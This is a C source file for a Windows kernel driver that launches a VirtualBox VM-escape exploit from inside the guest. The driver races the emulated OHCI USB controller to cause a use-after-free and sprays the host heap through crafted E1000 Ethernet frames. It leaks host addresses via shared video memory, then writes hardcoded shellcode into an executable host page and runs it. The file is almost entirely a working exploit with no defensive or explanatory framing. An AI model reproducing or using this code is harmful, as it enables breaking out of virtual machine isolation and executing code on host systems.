#include "Header.h"

DRIVER_INITIALIZE DriverEntry;
_Dispatch_type_(IRP_MJ_CREATE)
_Dispatch_type_(IRP_MJ_CLOSE)
DRIVER_DISPATCH SioctlCreateClose;
_Dispatch_type_(IRP_MJ_DEVICE_CONTROL)
DRIVER_DISPATCH SioctlDeviceControl;
DRIVER_UNLOAD SioctlUnloadDriver;

#define E1K_IOPORT_BASE         0xd000
#define VRAM_GUEST_BASE         0xe0000000
#define VRAM_SIZE               0x8000000
#define OHCI_MMIO_BASE_PHYSIC   0xF0808000
#define OHCI_MMIO_SIZE          0x1000
#define MAX_TRY                 0x100

uint8_t* mapped_vram = NULL;
uint8_t* mapped_ohci_mmio = NULL;

OHCIED *control_list_Ed = NULL;
OHCITD *control_list_td = NULL;
OHCIED *valid_hcca = NULL;

uint64_t host_vram = 0;
uint64_t vboxdd_addr = 0;
uint64_t heap_addr = 0;
uint64_t rwx_page = 0;
uint32_t offset_1000 = 0xffffffff;

uint32_t old_HcHCCA = 0;
uint32_t old_HcControl = 0;

uint32_t sleep_time = 1;

bool is_clear_hcca_thread_running = false;
uint32_t screen_buffer_size = 0x724200;
uint32_t guest_vram_host_addr = 0x10000000;

uint32_t shellcode[] = {    0x10eb10eb, 0x10eb10eb, 0x90909090, 0x90909090, 0x90909090, 0x90909090, 0x90909090, 0x56539090, 0x606a5557, \
                            0x6163685a, 0x5954636c, 0x65d42948, 0x48328b48, 0x4818768b, 0x4810768b, 0x308b48ad, 0x307e8b48, 0x8b3c5703, \
                            0x8b28175c, 0x48201f74, 0x548bfe01, 0xb70f241f, 0x528d172c, 0x3c81ad02, 0x6e695707, 0x8bef7545, 0x481c1f74, \
                            0x348bfe01, 0xf70148ae, 0x48d7ff99, 0x5d68c483, 0xc35b5e5f, 0x90909090 };

bool exploit();

PDRIVER_OBJECT GLOBAL_DRIVER_OBJECT;
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT   DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    NTSTATUS        ntStatus;
    UNICODE_STRING  ntUnicodeString;
    UNICODE_STRING  ntWin32NameString;
    PDEVICE_OBJECT  deviceObject = NULL;

    GLOBAL_DRIVER_OBJECT = DriverObject;

    UNREFERENCED_PARAMETER(RegistryPath);

    RtlInitUnicodeString(&ntUnicodeString, NT_DEVICE_NAME);

    ntStatus = IoCreateDevice(DriverObject, 0, &ntUnicodeString, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);

    if (!NT_SUCCESS(ntStatus))
    {
        DbgPrint(("[-] Couldn't create the device object\n"));
        return ntStatus;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = SioctlCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = SioctlCreateClose;
    DriverObject->DriverUnload = SioctlUnloadDriver;

    RtlInitUnicodeString(&ntWin32NameString, DOS_DEVICE_NAME);
    ntStatus = IoCreateSymbolicLink(&ntWin32NameString, &ntUnicodeString);
    if (!NT_SUCCESS(ntStatus))
    {
        DbgPrint(("[-] Couldn't create symbolic link\n"));
        IoDeleteDevice(deviceObject);
    }

    DbgPrint("[+] Start Vbox Exploit!!");
    exploit();

    return ntStatus;
}

NTSTATUS SioctlCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    PAGED_CODE();

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

VOID SioctlUnloadDriver(_In_ PDRIVER_OBJECT DriverObject)
{
    PDEVICE_OBJECT deviceObject = DriverObject->DeviceObject;
    UNICODE_STRING uniWin32NameString;

    PAGED_CODE();

    RtlInitUnicodeString(&uniWin32NameString, DOS_DEVICE_NAME);

    IoDeleteSymbolicLink(&uniWin32NameString);

    if (deviceObject != NULL)
    {
        IoDeleteDevice(deviceObject);
    }
}

void kernel_sleep(int t)
{
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = RELATIVE(MILLISECONDS(t));

    KeDelayExecutionThread(KernelMode, TRUE, &Timeout);
}

uint64_t get_physical_address(uint64_t address)
{
    PHYSICAL_ADDRESS physical_addr;
    physical_addr = MmGetPhysicalAddress(address);
    return physical_addr.QuadPart;
}

uint32_t ohci_get_register(uint32_t index)
{
    return ((uint32_t*)mapped_ohci_mmio)[index];
}

void ohci_set_register(uint32_t index, uint32_t value)
{
    ((uint32_t*)mapped_ohci_mmio)[index] = value;
}

void submiturb()
{
    control_list_Ed->HeadP = get_physical_address(control_list_td);
    control_list_Ed->hwinfo = ED_HWINFO_OUT;
    control_list_Ed->NextED = NULL;
    control_list_Ed->TailP = NULL;

    ohci_set_register(HcControlHeadED, get_physical_address(control_list_Ed));
    ohci_set_register(HcCommandStatus, OHCI_STATUS_CLF);
    ohci_set_register(HcHCCA, get_physical_address(valid_hcca));
}

PVOID alloc_DWORD_phys_addr(uint32_t size)
{
    do
    {
        PVOID result = MmAllocateNonCachedMemory(size);
        uint64_t phys_addr = get_physical_address(result);
        if (phys_addr >> 32)
        {
            MmFreeNonCachedMemory(result, size);
        }
        else
        {
            DbgPrint("[+] ALLOCATED: 0x%lx, Size: 0x%x", result, size);
            return result;
        }
    } while (true);

}

void e1k_reg_set(uint32_t register_offset, uint32_t value)
{
    int16_t IOADDR = E1K_IOPORT_BASE;
    int16_t IODATA = E1K_IOPORT_BASE + 4;
    ASMOutU32(IOADDR, register_offset);
    ASMOutU32(IODATA, value);
}

uint32_t e1k_reg_get(uint32_t register_offset)
{
    int16_t IOADDR = E1K_IOPORT_BASE;
    int16_t IODATA = E1K_IOPORT_BASE + 4;
    ASMOutU32(IOADDR, register_offset);
    return ASMInU32(IODATA);
}

void send_ethernet_frame(uint8_t* data, uint32_t size)
{
    E1KTXDESC *TX_descriptors = MmAllocateNonCachedMemory(sizeof(E1KTXDESC)* 3);
    if (!TX_descriptors)
    {
        DbgPrint("[-] ALLOC TX_descriptors FAILED\n");
        return;
    }
    memset(TX_descriptors, 0, sizeof(E1KTXDESC)* 3);

    uint32_t frame_size = 4 + size;

    PHYSICAL_ADDRESS TX_descriptors_physic, overwrite_data_physic;
    TX_descriptors_physic = MmGetPhysicalAddress(TX_descriptors);
    overwrite_data_physic = MmGetPhysicalAddress(data);

    uint32_t old_TDBAL = e1k_reg_get(0x03800);
    uint32_t old_TDBAH = e1k_reg_get(0x03804);
    uint32_t old_TDH = e1k_reg_get(0x03810);
    uint32_t old_TDT = e1k_reg_get(0x03818);

    e1k_reg_set(0x03800, TX_descriptors_physic.LowPart);
    e1k_reg_set(0x03804, TX_descriptors_physic.HighPart);

    TX_descriptors[0].context.dw2.u4DTYP = E1K_DTYP_CONTEXT;
    TX_descriptors[0].context.dw2.fDEXT = 1;
    TX_descriptors[0].context.dw2.fTSE = 1;
    TX_descriptors[0].context.dw3.u8HDRLEN = 0x3e;
    TX_descriptors[0].context.dw3.u16MSS = frame_size;
    TX_descriptors[0].context.dw2.u20PAYLEN = frame_size;
    TX_descriptors[0].context.ip.u8CSS = 0xe;
    TX_descriptors[0].context.tu.u8CSS = 0x36;
    TX_descriptors[0].context.tu.u8CSO = 0x36 + 6;

    TX_descriptors[1].data.u64BufAddr = overwrite_data_physic.QuadPart;
    TX_descriptors[1].data.cmd.u4DTYP = E1K_DTYP_DATA;
    TX_descriptors[1].data.cmd.fDEXT = 1;
    TX_descriptors[1].data.cmd.fTSE = 1;
    TX_descriptors[1].data.cmd.u20DTALEN = frame_size;
    TX_descriptors[1].data.dw3.fIXSM = 1;
    TX_descriptors[1].data.dw3.fTXSM = 1;

    TX_descriptors[2].data.u64BufAddr = overwrite_data_physic.QuadPart;
    TX_descriptors[2].data.cmd.u4DTYP = E1K_DTYP_DATA;
    TX_descriptors[2].data.cmd.fDEXT = 1;
    TX_descriptors[2].data.cmd.fTSE = 1;
    TX_descriptors[2].data.cmd.fEOP = 1;
    TX_descriptors[2].data.cmd.u20DTALEN = 0;

    e1k_reg_set(0x03810, 0);
    e1k_reg_set(0x03818, sizeof(E1KTXDESC)* 3);

    while (e1k_reg_get(0x03810) == 0);

    e1k_reg_set(0x03800, old_TDBAL);
    e1k_reg_set(0x03804, old_TDBAH);
    e1k_reg_set(0x03810, old_TDH);
    e1k_reg_set(0x03818, old_TDT);

    MmFreeNonCachedMemory(TX_descriptors, sizeof(E1KTXDESC)* 3);
}

void alloc_host_buffer(uint8_t* buf, uint32_t size)
{
    e1k_reg_set(0x00010, 0xff);
    send_ethernet_frame(buf, size);
    e1k_reg_set(0x00010, 0xff);
}

void heap_spray()
{
    PVUSBDEV pDev = (PVUSBDEV)MmAllocateNonCachedMemory(0x700);
    if (pDev)
    {
        for (int i = 0; i < 0x700; i++)
        {
            ((uint8_t*)pDev)[i] = i;
        }

        pDev->u8Address = 0;
        pDev->pUsbIns = 0;
        pDev->pNext = 0;
        pDev->pDescCache = 0;
        pDev->aPipes[0].out = 0;
        pDev->hUrbIoThread = 0;
        pDev->UrbPool.aLstFreeUrbs[0].pNext = guest_vram_host_addr;
		pDev->hSniffer = guest_vram_host_addr;
        for (int i = 0; i < 0x500; i++)
        {
            alloc_host_buffer(pDev, 0x6e8);
        }
    }

    MmFreeNonCachedMemory(pDev, 0x700);
}

void prepare_vram()
{
    PHYSICAL_ADDRESS vram;
    vram.QuadPart = VRAM_GUEST_BASE;

    if (!mapped_vram)
    {
        mapped_vram = (PVOID)MmMapIoSpace(vram, VRAM_SIZE, MmNonCached);
    }

    uint64_t* start = mapped_vram + screen_buffer_size;
    uint64_t size = (VRAM_SIZE - screen_buffer_size) / 8;

    for (int i = 0; i < size; i++)
    {
        start[i] = guest_vram_host_addr;
    }
}

bool leak_address_from_vram()
{
    uint64_t* start = mapped_vram + screen_buffer_size;
    uint64_t size = (VRAM_SIZE - screen_buffer_size) / 8;

    for (int i = 0; i < size; i++)
    {
        if (start[i] != guest_vram_host_addr)
        {
            offset_1000 = i;
            break;
        }
    }

    if (offset_1000 != 0xffffffff)
    {
        host_vram = guest_vram_host_addr - (offset_1000 * 8) - screen_buffer_size;

        //rwx_page = host_vram - 0x2491800;   //2GB RAM
        rwx_page = host_vram -   0x3bd57c0;   //4GB RAM 
        //rwx_page = host_vram - 0x5c59800;   //8GB RAM 
        //RWX page size :         0x801000
                               

        uint64_t* leaked_vboxdd_addr    = (uint8_t*)(&start[offset_1000]) + 0x60d;
        uint64_t* leaked_heap_addr      = (uint8_t*)(&start[offset_1000]) + +0x5fd;
        
        vboxdd_addr = leaked_vboxdd_addr[0];
        heap_addr   = leaked_heap_addr[0];

        DbgPrint("[+] Host Vram: 0x%llx\n", host_vram);
        DbgPrint("[+] RWX Page: 0x%llx\n", rwx_page);
        DbgPrint("[+] VBoxDD Address: 0x%llx\n", vboxdd_addr);
        DbgPrint("[+] Heap Address: 0x%llx\n", heap_addr);

        if ((vboxdd_addr >> 40) == 0x7f)
            return true;
        else
            return false;
    }
    else
    {
        DbgPrint("[-] Heap Spray Failed !!\n");
        return false;
    }
}

void write_shellcode(uint16_t shellcode, uint32_t offset)
{
    uint64_t* start = mapped_vram + screen_buffer_size;
    start[offset_1000] = guest_vram_host_addr + 0x1000000 + shellcode;
    start[offset_1000 + 1] = rwx_page + offset;

    uint64_t mark = start[offset_1000 + 1];

    submiturb();

    while (start[offset_1000 + 1] == mark)
    {
        kernel_sleep(1);
    }
}

void exec_shellcode()
{
    uint64_t* start = mapped_vram + screen_buffer_size;
    start[offset_1000] = rwx_page + 2;
    start[offset_1000 + 1] = heap_addr + 0x770;
    
    submiturb();

    kernel_sleep(5000); 
}

void uaf_exploit()
{
    DbgPrint("[+] UAF Exploit\n");

    // The pDev object is now sprayed
    submiturb();
    kernel_sleep(1000);


    if (leak_address_from_vram())
    {
        uint32_t offset = 0;
        for (int i = 0; i < sizeof(shellcode) / sizeof(uint32_t); i++)
        {
            uint32_t tmp = shellcode[i];
            write_shellcode(tmp & 0xffff, offset);
            offset += 2;
            write_shellcode(tmp >> 16, offset);
            offset += 2;
        }
        exec_shellcode();

        DbgPrint("[+] Breaked out !!!\n");
    }
    else
    {
        DbgPrint("[-] Exploit Failed !!!\n");
    }
}

bool init_exploit()
{
    // Fill vram with guest_vram_host_addr
    prepare_vram();

    // Map OHCI MMIO to mapped_ohci_mmio
    PHYSICAL_ADDRESS OHCI_MMIO_BASE;
    OHCI_MMIO_BASE.QuadPart = OHCI_MMIO_BASE_PHYSIC;
    if (!mapped_ohci_mmio)
    {
        mapped_ohci_mmio = (PVOID)MmMapIoSpace(OHCI_MMIO_BASE, OHCI_MMIO_SIZE, MmNonCached);
    }
    DbgPrint("[+] Mapped MMIO: 0x%llx", mapped_ohci_mmio);

    // Init descriptors
    uint8_t* empty_buffer   = alloc_DWORD_phys_addr(0x1000);
    OHCIED* failed_ed       = alloc_DWORD_phys_addr(sizeof(OHCIED));
    OHCITD* failed_td       = alloc_DWORD_phys_addr(sizeof(OHCITD));
    control_list_Ed         = alloc_DWORD_phys_addr(sizeof(OHCIED));
    control_list_td         = alloc_DWORD_phys_addr(sizeof(OHCITD));
    valid_hcca              = alloc_DWORD_phys_addr(sizeof(OHCIED));

    failed_ed->HeadP    = get_physical_address(failed_td);
    failed_ed->hwinfo   = ED_HWINFO_DIR + 1;
    failed_ed->NextED   = NULL;
    failed_ed->TailP    = NULL;
    failed_td->hwinfo   = TD_HWINFO_DIR + 1;

    control_list_Ed->HeadP  = get_physical_address(control_list_td);
    control_list_Ed->hwinfo = ED_HWINFO_OUT;
    control_list_Ed->NextED = get_physical_address(failed_ed);
    control_list_Ed->TailP  = NULL;

    control_list_td->hwinfo = TD_HWINFO_OUT;
    control_list_td->NextTD = NULL;
    control_list_td->be     = get_physical_address(empty_buffer) + 0x500;
    control_list_td->cbp    = get_physical_address(empty_buffer) + 0;

    // Backup
    old_HcHCCA      = ohci_get_register(HcHCCA);
    old_HcControl   = ohci_get_register(HcControl);
    DbgPrint("[+] old_HcHCCA: 0x%llx, old_HcControl: 0x%x", old_HcHCCA, old_HcControl);
}

void software_reset()
{
    ohci_set_register(HcCommandStatus, OHCI_STATUS_HCR);
    ohci_set_register(HcControl, old_HcControl);
}

bool exploit()
{
    init_exploit();

    // Resets the device 
    ohci_set_register(HcHCCA, 0);
    ohci_set_register(21, OHCI_PORT_PRS | OHCI_PORT_CLRSS);
    kernel_sleep(5000);

    for (int i = 0; i < MAX_TRY; i++)
    {
        // Do software reset before each try
        software_reset();

        // Set control list head
        ohci_set_register(HcControlHeadED, get_physical_address(control_list_Ed));

        // Reset the device, hope the urb is submitted between vusbIDeviceReset() and vusbDevResetDone()
        ohci_set_register(21, OHCI_PORT_PRS | OHCI_PORT_CLRSS);

        // Set a marker on HcControlCurrentED, ohciR3ServiceCtrlList() will clear this
        ohci_set_register(HcControlCurrentED, 0x1000);

        // Set control a list filled flag
        // OHCI_STATUS_CLF:
        //      + will be cleared if VUSBIRhSubmitUrb() success
        //      + will retain if VUSBIRhSubmitUrb() failed
        ohci_set_register(HcCommandStatus, OHCI_STATUS_CLF);

        // Set HcHCCA to any valid physical address and quickly clear it
        ohci_set_register(HcHCCA, get_physical_address(valid_hcca));
        kernel_sleep(sleep_time);
        ohci_set_register(HcHCCA, 0);

        // Wait for the proces
        kernel_sleep(3000);

        // Stop clear_hcca_thread
        is_clear_hcca_thread_running = false;

        // Read the result
        uint32_t marker = ohci_get_register(HcControlCurrentED);
        uint32_t status = ohci_get_register(HcCommandStatus);
        DbgPrint("[+] Race Result: 0x%x 0x%x", status, marker);

        if (marker == 0x1000)
        {
            // The marker isn't changed, so ohciR3ServiceCtrlList() is never called
            // We increase the sleep time before clearing hcca
            DbgPrint("[-] Clear hcca too soon: %d", sleep_time++);
        }
        else
        {
            // The marker is cleared, so ohciR3ServiceCtrlList() is hitted
            if (status == OHCI_STATUS_CLF)
            {
                // OHCI_STATUS_CLF isn't changed
                // It's mean VUSBIRhSubmitUrb() is failed then the URB will be freed twice, then the pDev is freed now

                // Spray the heap using ethernet frame
                heap_spray();

                // The device is poweroff now, so we need to reset it
                software_reset();

                // Do the Use-After-Free exploit
				DbgPrint("[+] Win the race, Object freed!!");
                uaf_exploit();

                break;

            }
            else
            {
                // OHCI_STATUS_CLF is cleared, so VUSBIRhSubmitUrb() is success
                DbgPrint("[-] Race Failed! Start Again\n");
            }
        }
    }

    software_reset();
    return true;
}
